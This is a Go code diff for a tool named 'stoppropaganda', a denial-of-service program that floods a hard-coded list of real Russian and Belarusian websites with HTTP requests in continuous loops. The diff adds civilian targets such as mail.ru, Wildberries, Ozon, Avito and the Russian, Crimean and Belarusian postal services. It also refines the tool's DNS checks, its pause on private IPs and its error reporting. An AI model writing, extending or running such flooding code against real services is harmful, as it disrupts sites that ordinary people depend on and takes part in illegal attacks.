@@ -1,11 +1,11 @@
 package stoppropaganda
 
 import (
-	"fmt"
 	"io"
 	"io/ioutil"
 	"net/http"
 	"net/url"
+	"strings"
 	"sync"
 	"time"
 )
@@ -60,6 +60,8 @@ var targetWebsites = map[string]struct{}{
 	"https://regnum.ru":         {},
 	"https://eadaily.com":       {},
 	"https://www.rubaltic.ru":   {},
+	"https://www.rambler.ru":    {},
+	"https://mail.ru":           {},
 
 	// Business corporations
 	"https://www.gazprom.ru":                    {},
@@ -80,6 +82,11 @@ var targetWebsites = map[string]struct{}{
 	"https://www.polymetalinternational.com/ru": {},
 	"https://www.uralkali.com/ru":               {},
 	"https://www.eurosib.ru":                    {},
+	"https://www.wildberries.ru":                {},
+	"https://www.ozon.ru":                       {},
+	"https://www.avito.ru":                      {},
+	"https://www.dns-shop.ru":                   {},
+	"https://aliexpress.ru":                     {},
 
 	// Banks
 	"https://www.sberbank.ru":                          {},
@@ -109,6 +116,8 @@ var targetWebsites = map[string]struct{}{
 	"https://uslugi27.ru":          {},
 	"https://gosuslugi29.ru":       {},
 	"https://gosuslugi.astrobl.ru": {},
+	"http://pochta.ru":             {},
+	"http://crimea-post.ru":        {},
 
 	// Others
 	"https://109.207.1.118":          {},
@@ -208,6 +217,7 @@ var targetWebsites = map[string]struct{}{
 	"https://www.belapb.by":               {},
 	"https://bankdabrabyt.by":             {},
 	"https://belinvestbank.by/individual": {},
+	"https://belpost.by":                  {},
 
 	// by business
 	"https://bgp.by/ru":           {},
@@ -257,7 +267,10 @@ type Website struct {
 	Counter_code400 uint `json:"status_400"`
 	Counter_code500 uint `json:"status_500"`
 
-	mux *sync.Mutex
+	mux            *sync.Mutex
+	pauseMux       *sync.Mutex
+	paused         bool
+	dnsLastChecked time.Time
 }
 
 func (ws *Website) Start(endpoint string) {
@@ -278,38 +291,56 @@ func (ws *Website) Start(endpoint string) {
 	req.Header.Set("Accept", "*/*")
 
 	ws.WorkersStatus = "Initializing"
-	pauseMux := sync.Mutex{}
-	dnsLastChecked := time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
+	ws.pauseMux = &sync.Mutex{}
+	ws.paused = false
+	ws.dnsLastChecked = time.Now().Add(-1 * VALIDATE_DNS_EVERY) // this forces to validate on first run
 
 	f := func() {
 		for {
-			pauseMux.Lock()
-			if time.Since(dnsLastChecked) >= VALIDATE_DNS_EVERY {
-				ipIsPrivate, err := isPrivateIP(websiteURL.Host)
+			ws.pauseMux.Lock()
+			if time.Since(ws.dnsLastChecked) >= VALIDATE_DNS_EVERY {
+				ipAddresses, err := getIPs(websiteURL.Host)
+				ws.dnsLastChecked = time.Now()
+
 				if err != nil {
 					ws.mux.Lock()
-					ws.WorkersStatus = fmt.Sprint("Unable to validate DNS:", err)
+					switch {
+					case strings.HasSuffix(err.Error(), "Temporary failure in name resolution"):
+						ws.WorkersStatus = "Your DNS servers unreachable or returned an error"
+					case strings.HasSuffix(err.Error(), "no such host"):
+						ws.WorkersStatus = "Domain does not exist"
+					case strings.HasSuffix(err.Error(), "No address associated with hostname"):
+						ws.WorkersStatus = "Domain does not have any IPs assigned"
+					default:
+						ws.WorkersStatus = err.Error()
+					}
+					ws.paused = true
 					ws.mux.Unlock()
-					time.Sleep(3 * time.Second)
-					pauseMux.Unlock()
+
+					time.Sleep(5 * time.Minute)
+					ws.pauseMux.Unlock()
 					continue
 				}
 
-				if ipIsPrivate {
-					ws.mux.Lock()
-					ws.WorkersStatus = fmt.Sprint("Private IP detected, DOS paused, will recheck in ", VALIDATE_DNS_EVERY.String())
-					ws.mux.Unlock()
-					time.Sleep(VALIDATE_DNS_EVERY)
-					pauseMux.Unlock()
-					continue
+				for _, ip := range ipAddresses {
+					if ip.IsPrivate() || ip.IsLoopback() {
+						ws.mux.Lock()
+						ws.WorkersStatus = "Private IP detected"
+						ws.paused = true
+						ws.mux.Unlock()
+
+						time.Sleep(5 * time.Minute)
+						ws.pauseMux.Unlock()
+						break
+					}
 				}
 
 				ws.mux.Lock()
 				ws.WorkersStatus = "Running"
+				ws.paused = false
 				ws.mux.Unlock()
-				dnsLastChecked = time.Now()
 			}
-			pauseMux.Unlock()
+			ws.pauseMux.Unlock()
 
 			// Perform request
 			resp, err := httpClient.Do(req)
@@ -317,7 +348,16 @@ func (ws *Website) Start(endpoint string) {
 				ws.mux.Lock()
 				ws.Requests++
 				ws.Errors++
-				ws.LastErrorMsg = err.Error()
+				switch {
+				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
+					ws.LastErrorMsg = "Request timed out"
+				case strings.HasSuffix(err.Error(), "connection refused"):
+					ws.LastErrorMsg = "Connection refused"
+				case strings.HasSuffix(err.Error(), "EOF"):
+					ws.LastErrorMsg = "Lost connection (EOF)"
+				default:
+					ws.LastErrorMsg = err.Error()
+				}
 				ws.mux.Unlock()
 				continue
 			}
@@ -343,6 +383,14 @@ func (ws *Website) Start(endpoint string) {
 			if err != nil {
 				ws.mux.Lock()
 				ws.Errors++
+				switch {
+				case strings.HasSuffix(err.Error(), "(Client.Timeout exceeded while awaiting headers)"):
+					ws.LastErrorMsg = "Response body timed out"
+				case strings.HasSuffix(err.Error(), "EOF"):
+					ws.LastErrorMsg = "Lost connection (EOF)"
+				default:
+					ws.LastErrorMsg = err.Error()
+				}
 				ws.mux.Unlock()
 			}
 			resp.Body.Close()
